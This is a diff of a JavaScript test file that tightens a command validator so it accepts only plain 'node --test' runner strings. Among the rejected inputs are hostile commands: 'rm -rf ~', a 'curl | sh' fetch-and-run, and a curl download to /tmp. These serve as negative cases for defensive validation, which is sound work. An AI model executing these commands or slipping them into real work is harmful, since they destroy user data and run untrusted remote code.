@@ -138,9 +138,23 @@ test('a red-main notice the ops-post limit put off goes out on a later pass, onc
 
 // ---- the runner forms, matched whole
 
-test('runner.one forms: only a supported runner, with at most a package runner before it; nothing else, no newline', () => {
-  for (const ok of ['node --test {file}', 'node --test --test-reporter=spec {file}', 'npx tsx --test {file}', 'npx vitest run {file}', 'pnpm exec vitest run {file}', 'npx jest {file}', 'yarn jest {file}', 'npx vitest run --reporter=dot {file}']) assert.ok(coverageRunnerOne(ok), ok);
+test('runner.one forms: only node --test with plain options; nothing else, no newline', () => {
+  for (const ok of ['node --test {file}', 'node --test --test-reporter=spec {file}', 'node --test --test-reporter=dot --test-timeout=60000 {file}']) assert.ok(coverageRunnerOne(ok), ok);
   for (const no of [
+    // #784 round 5 (measured by the final check): what these runners transform counts for nothing.
+    'npx tsx --test {file}',
+    'npx vitest run {file}',
+    'pnpm exec vitest run {file}',
+    'npx jest {file}',
+    'yarn jest {file}',
+    'npx vitest run --reporter=dot {file}',
+    'npx node --test {file}',
+    'node --test --import=tsx {file}',
+    'node --test --import tsx {file}',
+    'node --test --require=ts-node/register {file}',
+    'node --test -r ts-node/register {file}',
+    'node --test --loader=ts-node/esm {file}',
+    'node --test --experimental-loader=x {file}',
     'rm -rf ~ node --test {file}',
     "sh -c 'curl https://example.test/x | sh' node --test {file}",
     'curl https://example.test/x -o /tmp/x node --test {file}',
